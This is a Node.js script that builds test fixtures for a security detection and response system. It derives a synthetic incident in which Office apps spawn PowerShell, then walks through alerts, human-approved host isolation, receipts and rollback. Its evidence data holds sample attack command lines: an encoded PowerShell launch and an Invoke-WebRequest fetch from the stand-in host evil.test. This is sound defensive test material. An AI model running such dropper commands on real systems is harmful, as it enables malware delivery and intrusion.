#!/usr/bin/env node
// fixtures/build.mjs -- generate every file under fixtures/wire and fixtures/http
// plus fixtures/perch-demo-fixture.json and fixtures/SHA256SUMS, from ONE source
// of truth (this file plus fixtures/derive-ids.mjs).
//
// Run:  node fixtures/build.mjs
//
// Every number this script emits is either (a) copied from a shipped Ambush
// constant, (b) copied from scenarios/office-dropper-correlation.yaml, or
// (c) computed here by the same arithmetic the runtime uses, with the source
// cited in the comment above it. Nothing is typed in by eye.

import { createHash } from "node:crypto";
import { mkdirSync, writeFileSync, readdirSync, readFileSync } from "node:fs";
import { dirname, join } from "node:path";
import { fileURLToPath } from "node:url";
import { IDS } from "./derive-ids.mjs";

const HERE = dirname(fileURLToPath(import.meta.url));

// ───────────────────────────────────────────────────────────── shipped constants
// rulesets/default.yaml:55-60, loaded at daemon start into PheromoneConfig and
// resolved per class by PheromoneConfig::resolve_threat_class_policy
// (crates/swarm-core/src/pheromone.rs:295-311); the resolved policy is what
// concentration_for reads on every 10 Hz monitor tick in swarm_detect --serve.
const POLICY = {
  half_life_secs: 3600.0,
  evaporation_threshold: 0.01,
  min_sources_for_escalation: 2,
  alert_threshold: 2.0,
  incident_threshold: 5.0,
};
// rulesets/default.yaml:60
const DEESCALATION_COOLDOWN_SECS = 300;
// rulesets/default.yaml:93-95, read into StaticApprovalGate::from_config.
const HUMAN_GATE_SEVERITY = "HIGH";
const CAPABILITY_LEASE_TTL_MS = 60_000;
const MAX_ACTIONS_PER_SCOPE_PER_MINUTE = 5;
// crates/swarm-core/src/config/defaults.rs:23-27 -- runtime.containment.lease_ttl_ms.
// NOT settable from rulesets/default.yaml; the block is absent by design
// (crates/swarm-core/src/config/runtime.rs:88-93).
const CONTAINMENT_LEASE_TTL_MS = 900_000;
// crates/swarm-core/src/config/defaults.rs:15, set explicitly at rulesets/default.yaml:20.
const CONTINGENCY_LEASE_TTL_MS = 300_000;
// APPENDIX-NORMATIVE.md section 6 (PERCH_HOLD_TTL_MS, brief amendment A5).
const PERCH_HOLD_TTL_MS = 3_600_000;
// crates/swarm-whisker/src/detector.rs:274-276 and
// crates/swarm-whisker/src/suspicious_scripting.rs:277-279.
const HIGH_CONFIDENCE = 0.9;

// ────────────────────────────────────────────────────────────────── the clock
// Wall clock chosen once. 2026-03-17 is a Tuesday; the shift starts 08:00Z.
const S = (iso) => Math.floor(Date.parse(iso) / 1000); // UnixSeconds
const M = (iso) => Date.parse(iso);                    // UnixMillis
const SHIFT_START_MS = M("2026-03-17T08:00:00.000Z");

const T = {
  evt1_s: S("2026-03-17T09:14:32Z"),
  evt1_ingest_ms: M("2026-03-17T09:14:32.080Z"),
  finding_spt1_ms: M("2026-03-17T09:14:32.140Z"),
  finding_scr1_ms: M("2026-03-17T09:14:32.141Z"),
  tick_below_s: S("2026-03-17T09:14:33Z"),
  tick_below_ms: M("2026-03-17T09:14:33.000Z"),
  evt2_s: S("2026-03-17T09:14:41Z"),
  evt2_ingest_ms: M("2026-03-17T09:14:41.060Z"),
  finding_spt2_ms: M("2026-03-17T09:14:41.130Z"),
  cross_s: S("2026-03-17T09:14:41Z"),
  cross_ms: M("2026-03-17T09:14:41.900Z"),
  mode_ms: M("2026-03-17T09:14:41.900Z"),
  incident_ms: M("2026-03-17T09:14:42.400Z"),
  hold_a_ms: M("2026-03-17T09:14:42.600Z"),
  hold_b_ms: M("2026-03-17T09:14:42.700Z"),
  alarm_a_ms: M("2026-03-17T09:14:42.610Z"),
  alarm_b_ms: M("2026-03-17T09:14:42.710Z"),
  open_row_ms: M("2026-03-17T09:16:05.000Z"),
  leg1_ms: M("2026-03-17T09:16:19.000Z"),
  decide_ms: M("2026-03-17T09:16:19.300Z"),
  receipt_ms: M("2026-03-17T09:16:19.800Z"),
  lease_ms: M("2026-03-17T09:16:19.900Z"),
  hold_a_terminal_ms: M("2026-03-17T09:16:20.000Z"),
  dismiss_leg1_ms: M("2026-03-17T09:18:44.000Z"),
  dismiss_applied_ms: M("2026-03-17T09:18:44.200Z"),
  tick_after_dismiss_s: S("2026-03-17T09:18:45Z"),
  tick_after_dismiss_ms: M("2026-03-17T09:18:45.000Z"),
  rollback_ms: M("2026-03-17T09:31:19.900Z"),
  demo_now_ms: M("2026-03-17T09:20:00.000Z"),
};

// ───────────────────────────────────────────────────────────────── identities
const BRIDGE_ISSUER = `swarm:ed25519:${IDS.bridge_spine_pubkey}`;
// crates/swarm-runtime/src/agent_identity.rs:100-105 --
// PersistedAgentIdentity::from_signing_key sets id = AgentId::from_verifying_key,
// i.e. AgentId::from_public_key_hex -> `swarm:ed25519:{hex}`
// (crates/swarm-core/src/types.rs:16-22). This is the value the daemon's ingest
// path passes as EventExecutionContext.agent_id
// (crates/swarm-ingest-runtime/src/ingest/mod.rs:1074, :1184) and therefore the
// value that ends up in ActionRequest.requested_by
// (crates/swarm-runtime/src/service/runtime_service.rs:391).
const DAEMON_AGENT_ID = `swarm:ed25519:${IDS.daemon_ingest_pubkey}`;
const OPERATOR_ID = "perch-operator-1";
const OPERATOR_VOTER_ID = `swarm:ed25519:${IDS.operator_ed25519_pubkey}`;

// ─────────────────────────────────────────────────── deposits and arithmetic
// PheromoneDeposit.timestamp is UnixSECONDS and decay_half_life is seconds
// (crates/swarm-core/src/pheromone.rs:281-292, strength_at). agent_id is
// strategy-scoped: resolve_deposits sets
// `strategy_scoped_agent_id(agent_id, &finding.strategy_id)`
// (crates/swarm-runtime/src/detection/pipeline.rs:573), which
// crates/swarm-whisker/src/stream.rs:19-21 formats as `{base}:{strategy_id}`.
const DEPOSITS = [
  { strategy_id: "suspicious_process_tree", event_id: "hunt-evt-1", timestamp: T.evt1_s, confidence: HIGH_CONFIDENCE },
  { strategy_id: "suspicious_scripting", event_id: "hunt-evt-1", timestamp: T.evt1_s, confidence: HIGH_CONFIDENCE },
  { strategy_id: "suspicious_process_tree", event_id: "hunt-evt-2", timestamp: T.evt2_s, confidence: HIGH_CONFIDENCE },
].map((d) => ({ ...d, agent_id: `${DAEMON_AGENT_ID}:${d.strategy_id}`, host_id: "host-ops-1" }));

// crates/swarm-core/src/pheromone.rs:281-287.
const strengthAt = (d, now) =>
  now <= d.timestamp ? d.confidence : d.confidence * Math.pow(0.5, (now - d.timestamp) / POLICY.half_life_secs);

// crates/swarm-pheromone/src/substrate.rs:1268-1304, verbatim in structure:
// skip evaporated (:1283), skip feedback-suppressed (:1286), skip strength <= 0
// (:1290), sum strength_at, count distinct deposit.agent_id.0 (:1295).
function concentrationFor(deposits, now, suppressedEventIds = new Set(), threatClass = "execution") {
  const sources = new Set();
  let total = 0;
  let peak = 0;
  for (const d of deposits) {
    if (d.timestamp > now && !(now <= d.timestamp)) continue;
    if (strengthAt(d, now) < POLICY.evaporation_threshold) continue;
    if (suppressedEventIds.has(d.event_id)) continue;
    const s = strengthAt(d, now);
    if (s <= 0) continue;
    total += s;
    peak = Math.max(peak, d.confidence);
    sources.add(d.agent_id);
  }
  return {
    threat_class: threatClass,
    total_strength: round6(total),
    distinct_sources: sources.size,
    peak_confidence: peak,
  };
}
const round6 = (n) => Math.round(n * 1e6) / 1e6;
// crates/swarm-core/src/pheromone.rs:334-336.
const exceeds = (c) =>
  c.total_strength >= POLICY.alert_threshold && c.distinct_sources >= POLICY.min_sources_for_escalation;

const at = (isoSeconds, deposits = DEPOSITS, suppressed = new Set(), threatClass = "execution") =>
  concentrationFor(deposits.filter((d) => d.timestamp <= isoSeconds), isoSeconds, suppressed, threatClass);

const CONC = {
  below: at(T.tick_below_s),
  crossing: at(T.cross_s),
  at_open_row: at(S("2026-03-17T09:16:05Z")),
  before_dismiss: at(S("2026-03-17T09:18:44Z")),
  after_dismiss: at(T.tick_after_dismiss_s, DEPOSITS, new Set(["hunt-evt-1"])),
};

// ────────────────────────────────────────────────────────── shared card parts
const ISO = (ms) => new Date(ms).toISOString().replace(/\.\d{3}Z$/, "Z");

// ── RFC 8785 (JCS) canonicalization, ported from the one the daemon uses ──
// crates/swarm-crypto/src/canonical.rs::canonicalize, re-exported as
// `canonicalize_json` at crates/swarm-crypto/src/lib.rs:37 and called by
// `envelope_signing_bytes` (crates/swarm-spine/src/envelope.rs:38-45), which is
// what `compute_envelope_hash_hex` (:47-51) hashes. Three clauses have to match
// byte for byte or the hash below is decorative:
//   objects  keys sorted by UTF-16 CODE UNIT (canonical.rs:46-61). JS's default
//            Array#sort on strings is exactly that comparison.
//   numbers  integers via the i64/u64 arms (canonical.rs:64-72), otherwise the
//            ES6 shortest-round-trip form (canonicalize_f64, :77-106). For every
//            value in |x| ∈ [1e-6, 1e21) that is `String(x)` in JS, and this
//            fixture carries nothing outside that band — asserted below.
//   strings  the eight named escapes plus \u00xx for control chars
//            (escape_json_string, canonical.rs:205-223). Rust's char::is_control
//            also covers U+007F–U+009F where JSON.stringify does not, so any
//            such character is REFUSED here rather than silently diverging.
function jcs(value) {
  if (value === null) return "null";
  const t = typeof value;
  if (t === "boolean") return value ? "true" : "false";
  if (t === "number") {
    if (!Number.isFinite(value)) throw new Error("non-finite number in envelope");
    if (value === 0) return "0";
    const a = Math.abs(value);
    if (!(a >= 1e-6 && a < 1e21)) {
      throw new Error(`number ${value} needs the exponential JCS form; port it before using it`);
    }
    return String(value);
  }
  if (t === "string") {
    for (const ch of value) {
      const c = ch.codePointAt(0);
      if ((c >= 0x7f && c <= 0x9f)) {
        throw new Error(`U+${c.toString(16)} escapes differently in Rust and JS; not allowed in a fixture`);
      }
    }
    return JSON.stringify(value);
  }
  if (Array.isArray(value)) return "[" + value.map(jcs).join(",") + "]";
  if (t === "object") {
    const keys = Object.keys(value).sort();
    return "{" + keys.map((k) => jcs(k) + ":" + jcs(value[k])).join(",") + "}";
  }
  throw new Error(`unserializable ${t} in envelope`);
}

// crates/swarm-spine/src/envelope.rs:47-51 -- sha256 over the canonical bytes of
// the envelope WITHOUT envelope_hash and WITHOUT signature, `0x`-prefixed
// (swarm-crypto/src/hashing.rs:107-109). Computed here, not stubbed, so a reader
// can recompute it from the committed file and so the demo's "check against the
// daemon" affordance is a real diff rather than a picture of one.
const envelopeHash = (unsigned) => "0x" + createHash("sha256").update(jcs(unsigned), "utf8").digest("hex");
const rationaleSha256 = (value) => value == null
  ? null
  : createHash("sha256").update(value, "utf8").digest("hex");

// seq and prev_envelope_hash are PER (issuer, stream), not global
// (13-WIRE-SCHEMAS.md SEQ commitment). The bridge publishes every card the
// daemon produces on its evidence stream; the operator's own console publishes
// the two `swarm:verdict:v1` cards under the operator's spine identity, which
// is a different issuer and therefore a different chain. A consumer that treats
// them as one chain reports a phantom gap at every verdict.
const CHAINS = new Map();
function chain(issuer, stream) {
  const key = `${issuer}\u0000${stream}`;
  if (!CHAINS.has(key)) CHAINS.set(key, { seq: 0, prev: null });
  return CHAINS.get(key);
}

/**
 * Build one spine envelope.
 *
 * `issuer` is WHO PUBLISHED (13-WIRE-SCHEMAS.md TWO ISSUERS): the bridge for
 * every card the daemon produced, the operator for a verdict card the console
 * published. `fact.issuer` — a different field, set by each card builder — is
 * who PRODUCED the fact.
 */
function envelope(label, fact, issuedAtMs, opts = {}) {
  const issuer = opts.issuer ?? BRIDGE_ISSUER;
  const stream = opts.stream ?? "evidence";
  const c = chain(issuer, stream);
  c.seq += 1;
  const unsigned = {
    schema: "swarm.spine.envelope.v1",
    issuer,
    seq: c.seq,
    prev_envelope_hash: c.prev,
    issued_at: ISO(issuedAtMs),
    capability_token: null,
    fact,
  };
  const hash = envelopeHash(unsigned);
  c.prev = hash;
  // `signature` is ABSENT, not null: build_signed_envelope adds the key only
  // when it signs (crates/swarm-spine/src/envelope.rs:97-99), and its absence is
  // what pins every card in this fixture at verification tier 0 until B6.
  return { ...unsigned, envelope_hash: hash };
}

// The FactIssuer for anything the shipped daemon ingest/replay path produces.
// `role` is null because infer_agent_role
// (crates/swarm-runtime/src/detection/pipeline.rs:583-604) matches on the
// `{role}-` prefix and the only agent id on this path is
// `swarm:ed25519:{hex}`, which matches none of the eight arms. See
// 22-DEMO-FIXTURE.md amendment F-2.
const DAEMON_FACT_ISSUER = { swarm_agent_id: DAEMON_AGENT_ID, role: null, nostr_pubkey: null };

// ── the three detector findings ────────────────────────────────────────────
// Evidence is copied field-for-field from what the two detectors actually
// build: crates/swarm-whisker/src/detector.rs:196-212 (suspicious_process_tree)
// and crates/swarm-whisker/src/suspicious_scripting.rs:160-179
// (suspicious_scripting), for the telemetry in
// scenarios/office-dropper-correlation.yaml.
const EVIDENCE = {
  spt1: {
    source: "synthetic",
    parent_process: "WINWORD",
    process_name: "powershell",
    command_line: "powershell.exe -enc AAA=",
    normalized_command_line: "powershell.exe -enc AAA=",
    decoded_command_segments: [],
    command_line_transforms: [],
    user: "alice",
    host_id: "host-ops-1",
    heuristics: { encoded_flag: true, download_hint: false },
  },
  scr1: {
    parent_process: "WINWORD",
    process_name: "powershell",
    command_line: "powershell.exe -enc AAA=",
    normalized_command_line: "powershell.exe -enc AAA=",
    decoded_command_segments: [],
    command_line_transforms: [],
    user: "alice",
    host_id: "host-ops-1",
    heuristics: { encoded: true, download_execute: false, lolbin_abuse: false, matched_lolbin: null },
  },
  spt2: {
    source: "synthetic",
    parent_process: "OUTLOOK",
    process_name: "powershell",
    command_line: "powershell.exe Invoke-WebRequest https://evil.test",
    normalized_command_line: "powershell.exe invoke-webrequest https://evil.test",
    decoded_command_segments: [],
    command_line_transforms: [],
    user: "alice",
    host_id: "host-ops-1",
    heuristics: { encoded_flag: false, download_hint: true },
  },
};

function findingCard(label, { strategyId, eventId, evidence, emittedMs }) {
  const finding = {
    schema: "swarm_finding",
    finding_id: `${strategyId}:${eventId}`,
    event_id: eventId,
    strategy_id: strategyId,
    threat_class: "execution",
    severity: "CRITICAL",
    confidence: HIGH_CONFIDENCE,
    evidence,
  };
  return envelope(label, {
    schema: "swarm.perch.finding.v1",
    issuer: DAEMON_FACT_ISSUER,
    emitted_at_ms: emittedMs,
    locator: {
      finding_id: finding.finding_id,
      event_id: eventId,
      strategy_id: strategyId,
      host_id: "host-ops-1",
      lane_channel: IDS.lane_execution_channel,
    },
    finding,
  }, emittedMs);
}

// ── the escalation ─────────────────────────────────────────────────────────
function escalationCard() {
  return envelope("escalation", {
    schema: "swarm.perch.escalation.v1",
    issuer: { swarm_agent_id: "concentration-monitor", role: null, nostr_pubkey: null },
    emitted_at_ms: T.cross_ms,
    locator: { lane_channel: IDS.lane_execution_channel, case_channel: null },
    escalation: {
      cause: "concentration_crossing",
      threat_class: "execution",
      level: "alert",
      total_strength: CONC.crossing.total_strength,
      distinct_sources: CONC.crossing.distinct_sources,
      distinct_sources_counts: "strategy_scoped_agent_id",
      peak_confidence: CONC.crossing.peak_confidence,
      mode_changed: true,
      current_mode: "alert",
      dedupe_key: `execution:alert:${T.cross_s}`,
      source_ids: null,
      // REQUIRED, and exactly one of it and source_ids is non-null. The ids
      // cannot be carried: RuntimeEvent::Escalation holds `distinct_sources:
      // usize` and no ids (crates/swarm-runtime/src/runtime_events.rs:288-296),
      // and the bridge takes a broadcast::Receiver with no substrate handle, so
      // it cannot resolve them either. Only B4 can. A surface renders THIS
      // REASON beside the count; it never fabricates the agent half of render
      // law 2 and never spins waiting for it.
      source_ids_absent_reason: "not_carried_by_runtime_event",
    },
  }, T.cross_ms);
}

// ── the two holds ──────────────────────────────────────────────────────────
const ACTION_A = { type: "isolate_host", host_id: "host-ops-1" };
const ACTION_B = { type: "block_egress", target: "198.51.100.20" };

function actionRequest(action, huntId, evidence) {
  return { hunt_id: huntId, requested_by: DAEMON_AGENT_ID, action, severity: "CRITICAL", evidence };
}

// crates/swarm-policy/src/static_gate.rs:294-299 -- the ONLY production
// RequireHuman producer, and it returns this exact constant pair for all twelve
// destructive kinds.
const POLICY_DECISION = {
  verdict: "require_human",
  rule_name: "static.human_gate",
  reason: "authorized but held for human approval",
};

function rationale(conc) {
  return {
    rule_name: POLICY_DECISION.rule_name,
    reason: POLICY_DECISION.reason,
    threat_class: "execution",
    severity: "CRITICAL",
    request_carried_fields: ["severity", "threat_class"],
    concentration_at_hold: conc,
    escalation_level: "alert",
    governance_receipt_present: false,
  };
}

// crates/swarm-core/src/types.rs:505-513, derived through the public wrapper
// SwarmService::rehearsal_preview (service/runtime_service.rs:861-868).
const REHEARSAL_A = {
  rehearsal_id: `rehearsal:hunt-evt-1:isolate_host:${T.hold_a_ms}`,
  source_bundle_id: "replay:hellcat_office_demo:hunt-evt-1",
  prepared_at_ms: T.hold_a_ms,
  simulated_only: true,
  blast_radius: {
    scope_kind: "host",
    scope_value: "host-ops-1",
    impact: "host_connectivity_isolated",
    max_affected_scopes: 1,
    affected_capabilities: ["network.egress", "network.ingress"],
    summary: "one host loses network connectivity",
  },
  rollback: {
    required: true,
    summary: "restore host connectivity",
    steps: [{ kind: "restore_host_connectivity", summary: "re-enable host-ops-1 network interfaces" }],
  },
};
const REHEARSAL_B = {
  rehearsal_id: `rehearsal:hunt-evt-2:block_egress:${T.hold_b_ms}`,
  source_bundle_id: "replay:hellcat_office_demo:hunt-evt-2",
  prepared_at_ms: T.hold_b_ms,
  simulated_only: true,
  blast_radius: {
    scope_kind: "network_target",
    scope_value: "198.51.100.20",
    impact: "network_egress_blocked",
    max_affected_scopes: 1,
    affected_capabilities: ["network.egress"],
    summary: "egress to one address is blocked",
  },
  rollback: {
    required: true,
    summary: "remove the network block",
    steps: [{ kind: "remove_network_block", summary: "withdraw the egress block for 198.51.100.20" }],
  },
};

// crates/swarm-response/src/rollback.rs:151-192 (resolve_inverse). DERIVED --
// the console computes it and marks it so (render law 4).
const INVERSE_A = [{ step_kind: "restore_host_connectivity", verdict: "executable", reason: null }];
const INVERSE_B = [{
  step_kind: "remove_network_block",
  verdict: "unmapped",
  reason: "block_egress is not a containment action, so no ContainmentInverse is resolved for it",
}];

function holdBody(id, { state, action, huntId, evidence, heldMs, rehearsal, inverse, leases, conc, decision }) {
  return {
    hold_id: id,
    state,
    action_kind: action.type,
    severity: "CRITICAL",
    held_at_ms: heldMs,
    expires_at_ms: heldMs + PERCH_HOLD_TTL_MS,
    action_request: actionRequest(action, huntId, evidence),
    policy_decision: POLICY_DECISION,
    rationale: rationale(conc),
    leases_a_containment: leases,
    rehearsal,
    inverse_resolution: inverse,
    decision: decision ?? null,
  };
}

function holdCard(label, holdId, findingCardId, body, emittedMs) {
  return envelope(label, {
    schema: "swarm.perch.hold.v1",
    issuer: DAEMON_FACT_ISSUER,
    emitted_at_ms: emittedMs,
    locator: {
      hold_id: holdId,
      case_channel: IDS.case_channel,
      hunt_id: body.action_request.hunt_id,
      finding_card_id: findingCardId,
    },
    hold: body,
  }, emittedMs);
}

const HOLD_A_OPEN = holdBody(IDS.hold_a, {
  state: "notified", action: ACTION_A, huntId: "hunt-evt-1", evidence: EVIDENCE.spt1,
  heldMs: T.hold_a_ms, rehearsal: REHEARSAL_A, inverse: INVERSE_A, leases: true, conc: CONC.crossing,
});
const HOLD_B_OPEN = holdBody(IDS.hold_b, {
  state: "notified", action: ACTION_B, huntId: "hunt-evt-2", evidence: EVIDENCE.spt2,
  heldMs: T.hold_b_ms, rehearsal: REHEARSAL_B, inverse: INVERSE_B, leases: false, conc: CONC.crossing,
});

// crates/swarm-policy/src/static_gate.rs:307-324 -- capability_id is
// `lease:{hunt}:{action}:{now_ms}` and expires_at_ms is context.now_ms +
// lease_ttl_ms. B2 builds the ApprovalContext at the DECISION instant, so
// now_ms here is the store's compare-and-set instant.
const CAPABILITY_LEASE = {
  capability_id: `lease:hunt-evt-1:isolate_host:${T.decide_ms}`,
  expires_at_ms: T.decide_ms + CAPABILITY_LEASE_TTL_MS,
  action: "isolate_host",
  // crates/swarm-policy/src/static_gate.rs:234 -- IsolateHost { host_id } -> host_id.
  scope: "host-ops-1",
};
// crates/swarm-response/src/adapters.rs:50 -- the SHIPPED SandboxExecutor's id
// format. Not `resp-contain:...`, which nothing in the workspace produces.
const RECEIPT_ID = `resp:hunt-evt-1:${CAPABILITY_LEASE.capability_id}`;

const HOLD_A_DECISION = {
  decision: "grant",
  operator_id: OPERATOR_ID,
  decided_at_ms: T.decide_ms,
  nostr_intent_event_id: IDS.ev_verdict_grant,
  signature: {
    algorithm: "ed25519",
    key_id: OPERATOR_ID,
    public_key_hex: IDS.operator_ed25519_pubkey,
    signature_hex: IDS.operator_ed25519_sig_grant,
  },
  rationale: "Two detectors on one workstation, encoded PowerShell under WINWORD and a fetch under OUTLOOK. Isolating host-ops-1 while we read the disk.",
  outcome: "granted_executed",
  dispatched: true,
  receipt_id: RECEIPT_ID,
  refusal: null,
};

const HOLD_A_TERMINAL = holdBody(IDS.hold_a, {
  state: "executed", action: ACTION_A, huntId: "hunt-evt-1", evidence: EVIDENCE.spt1,
  heldMs: T.hold_a_ms, rehearsal: REHEARSAL_A, inverse: INVERSE_A, leases: true,
  conc: CONC.crossing, decision: HOLD_A_DECISION,
});

// ── the verdict cards (leg 1) ──────────────────────────────────────────────
function verdictGrantCard() {
  return envelope("verdict-grant", {
    schema: "swarm.perch.verdict.v1",
    issuer: { swarm_agent_id: OPERATOR_ID, role: null, nostr_pubkey: IDS.operator_nostr_pubkey },
    emitted_at_ms: T.leg1_ms,
    locator: { hold_id: IDS.hold_a, case_channel: IDS.case_channel, hold_card_id: IDS.ev_hold_a_open },
    decision: {
      decision: "grant",
      hold_id: IDS.hold_a,
      operator_id: OPERATOR_ID,
      decided_at_ms: T.leg1_ms,
      rationale_sha256: rationaleSha256(HOLD_A_DECISION.rationale),
      rationale: HOLD_A_DECISION.rationale,
    },
    signature: HOLD_A_DECISION.signature,
    leg2: { state: "sending", receipt_id: null, refusal_check: null, superseded_by: null, superseded_at_ms: null },
    // The envelope's issuer is the OPERATOR's spine identity, not the bridge's:
    // 13-WIRE-SCHEMAS.md's TWO ISSUERS commitment reads "the bridge; the
    // operator on a verdict card". This is also why `seq` restarts at 1 here —
    // the chain is per (issuer, stream) and the console's is its own.
  }, T.leg1_ms, { issuer: OPERATOR_VOTER_ID, stream: "verdict" });
}

// ── the receipt ────────────────────────────────────────────────────────────
function receiptCard() {
  const responseReceipt = {
    receipt_id: RECEIPT_ID,
    action: "isolate_host",
    mode: "enforced",
    status: "executed",
    // crates/swarm-response/src/adapters.rs:57 -- `sandbox {mode:?} for {action}`.
    summary: "sandbox Enforced for isolate_host",
    details: {
      mode: "enforced",
      capability_id: CAPABILITY_LEASE.capability_id,
      scope: CAPABILITY_LEASE.scope,
      requested_by: DAEMON_AGENT_ID,
    },
    audit: {
      policy: { verdict: "require_human", rule_name: "static.human_gate", reason: "authorized but held for human approval" },
      // B2o. Absent on every autonomous action; present here because a human
      // was asked and answered. Until B2o lands, this key does not exist and
      // the Ledger says "a human was asked", never a name.
      approved_by: {
        operator_id: OPERATOR_ID,
        voter_id: OPERATOR_VOTER_ID,
        hold_id: IDS.hold_a,
        decided_at_ms: T.decide_ms,
        signature: HOLD_A_DECISION.signature,
        nostr_intent_event_id: IDS.ev_verdict_grant,
      },
    },
  };
  return envelope("receipt", {
    schema: "swarm.perch.receipt.v1",
    issuer: DAEMON_FACT_ISSUER,
    emitted_at_ms: T.receipt_ms,
    locator: {
      receipt_id: RECEIPT_ID,
      trail_id: IDS.trail_a,
      hunt_id: "hunt-evt-1",
      case_channel: IDS.case_channel,
      verdict_card_id: IDS.ev_verdict_grant,
    },
    audit_trail: {
      trail_id: IDS.trail_a,
      hunt_id: "hunt-evt-1",
      related_receipt_ids: [],
      detection: {
        finding_id: "suspicious_process_tree:hunt-evt-1",
        event_id: "hunt-evt-1",
        threat_class: "execution",
        severity: "CRITICAL",
        confidence: HIGH_CONFIDENCE,
        evidence: EVIDENCE.spt1,
        strategy_id: "suspicious_process_tree",
      },
      policy: { verdict: "require_human", rule_name: "static.human_gate", reason: POLICY_DECISION.reason, lease: CAPABILITY_LEASE },
      response: { kind: "success", ...responseReceipt },
      created_at_ms: T.receipt_ms,
    },
  }, T.receipt_ms);
}

// ── the containment lease ──────────────────────────────────────────────────
// The persisted ContainmentLeaseRecord, built ONCE and shared by the kind:9
// lease card and the GET /v1/operator/containment/leases body. Two call sites
// must see byte-identical bytes, and `envelope()` has a side effect -- it
// consumes the next seq on the (issuer, stream) chain -- so calling leaseCard()
// twice to reach this object silently forks the chain. validate.mjs's chain walk
// caught exactly that while this was being written, which is what the walk is
// for.
const CONTAINMENT_LEASE_RECORD = {
  schema_version: 1,
  lease_id: IDS.containment_lease,
  action: ACTION_A,
  origin_receipt_id: RECEIPT_ID,
  // NO `governance_receipt_id` KEY, and that is the wire, not an omission.
  // ContainmentLease serializes `into = "ContainmentLeaseRecord"`
  // (crates/swarm-response/src/containment.rs:130) and the record declares
  // `#[serde(default, skip_serializing_if = "Option::is_none")]` on that
  // field at :108-109, so a None DROPS THE KEY. Emitting an explicit null
  // here would give a decoder a shape the daemon never produces and leave
  // the absent-key path untested.
  //
  // CONTRAST, and do not "fix" both the same way: RollbackReceipt's
  // identically-named field (crates/swarm-response/src/rollback.rs:258) has
  // NO skip_serializing_if, so it really does serialize as null — which is
  // what card-11 emits. Two adjacent structs, one field name, two wire
  // shapes, both correct.
  blast_radius: REHEARSAL_A.blast_radius,
  rollback: REHEARSAL_A.rollback,
  issued_at_ms: T.lease_ms,
  expires_at_ms: T.lease_ms + CONTAINMENT_LEASE_TTL_MS,
};

function leaseCard() {
  return envelope("lease", {
    schema: "swarm.perch.lease.v1",
    issuer: DAEMON_FACT_ISSUER,
    emitted_at_ms: T.lease_ms,
    locator: {
      lease_id: IDS.containment_lease,
      origin_receipt_id: RECEIPT_ID,
      case_channel: IDS.case_channel,
      receipt_card_id: IDS.ev_receipt,
    },
    ttl_source: "runtime.containment.lease_ttl_ms",
    lease: CONTAINMENT_LEASE_RECORD,
  }, T.lease_ms);
}

// ── the rollback receipt ───────────────────────────────────────────────────
function rollbackCard() {
  return envelope("rollback", {
    schema: "swarm.perch.rollback.v1",
    issuer: { swarm_agent_id: "containment-sweep", role: null, nostr_pubkey: null },
    emitted_at_ms: T.rollback_ms,
    locator: {
      rollback_id: IDS.rollback,
      lease_id: IDS.containment_lease,
      case_channel: IDS.case_channel,
      lease_card_id: IDS.ev_lease,
    },
    partition_state_at_execution: "healthy",
    rollback_receipt: {
      rollback_id: IDS.rollback,
      lease_id: IDS.containment_lease,
      origin_receipt_id: RECEIPT_ID,
      trigger: "expiry",
      mode: "enforced",
      status: "executed",
      steps: [{ kind: "restore_host_connectivity", status: "reversed", detail: "host-ops-1 network interfaces re-enabled" }],
      summary: "1 of 1 steps reversed",
      completed_at_ms: T.rollback_ms,
      governance_receipt_id: null,
    },
  }, T.rollback_ms);
}

// crates/swarm-runtime/src/escalation.rs:315-330 -- standard_threat_classes(),
// twelve, in this order. snapshot_concentrations publishes ALL TWELVE on every
// tick regardless of value (escalation.rs:198-199).
const TWELVE = ["lateral_movement", "data_exfiltration", "privilege_escalation", "command_and_control",
  "initial_access", "persistence", "supply_chain", "defense_evasion", "credential_access",
  "discovery", "execution", "impact"];
function twelveClasses(executionConc) {
  return TWELVE.map((tc) => tc === "execution"
    ? { threat_class: "execution", total_strength: executionConc.total_strength, distinct_sources: executionConc.distinct_sources, peak_confidence: executionConc.peak_confidence }
    : { threat_class: tc, total_strength: 0.0, distinct_sources: 0, peak_confidence: 0.0 });
}


// ═══════════════════════════════════════════════════════════════════════════
// THE SURFACE DATA — added so no peer artifact has to invent a parallel cast.
//
// Everything below is DERIVED from the same three constants and the same
// concentration_for port above. It exists because five wave-2 prototypes each
// declared their own "shared fixture" for the same case, with five channel
// UUIDs, six hold-id grammars and five different total_strengths, and the
// stated reason was that this fixture did not carry what a twelve-lane wall or
// a four-queue inbox needs. It does now.
//
// THE BRIGHT LINE, and it is the whole reason this can live in one file:
// `story` data is the hellcat-office incident — every card, hold, receipt,
// lease and rollback derives from it, and §1's one-host rule still binds it.
// `background` is the rest of the colony's shift. NOTHING in `background` ever
// becomes a card, a hold, a receipt or a decision; it exists so a wall screen
// is not eleven zeros and one curve. A surface that mints a hold out of a
// background deposit has misread the file.
// ═══════════════════════════════════════════════════════════════════════════

// ── which detector can even produce which lane ─────────────────────────────
// Read off each detector's own `evaluate`, which is the only place a
// DetectionFinding's threat_class is set, all of them called through
// CompositeDetector on `swarm_detect --serve`'s detect path. Fifteen strategy
// ids exist (each one's `DetectionStrategy::id`); this is what they emit.
const DETECTOR_THREAT_CLASSES = {
  behavioral_anomaly: ["command_and_control", "credential_access", "data_exfiltration", "defense_evasion", "execution", "lateral_movement", "persistence"],
  cloudtrail: ["credential_access", "impact", "initial_access", "persistence", "privilege_escalation"],
  composite: ["execution"],
  credential_access: ["credential_access"],
  dns_exfiltration: ["data_exfiltration"],
  fileless_execution: ["defense_evasion", "privilege_escalation"],
  infrastructure_anomaly: ["defense_evasion", "execution", "impact"],
  kubernetes_audit: ["privilege_escalation"],
  lateral_movement: ["lateral_movement"],
  mock: ["execution"],
  network_connect: ["command_and_control"],
  persistence: ["persistence"],
  supply_chain: ["supply_chain"],
  suspicious_process_tree: ["execution"],
  suspicious_scripting: ["execution"],
};

// FINDING F-11. `discovery` is one of the twelve standard lanes
// (standard_threat_classes(), crates/swarm-runtime/src/escalation.rs:315-330,
// iterated by snapshot_concentrations on every monitor tick so the lane is
// always published) and NO SHIPPED DETECTOR EMITS IT. Thirteen occurrences of
// `ThreatClass::Discovery` exist in crates/; twelve are name-formatting match
// arms or the lane enumeration itself, and the thirteenth
// (crates/swarm-runtime/src/calico_agent.rs:1019) is inside a `#[cfg(test)]`
// module that begins at :907. The lane is therefore structurally empty on every
// shipped build, and render law 7 says an empty state names what is
// deliberately not covered — so this lane's empty state is a coverage gap with
// a cause, not a quiet hour.
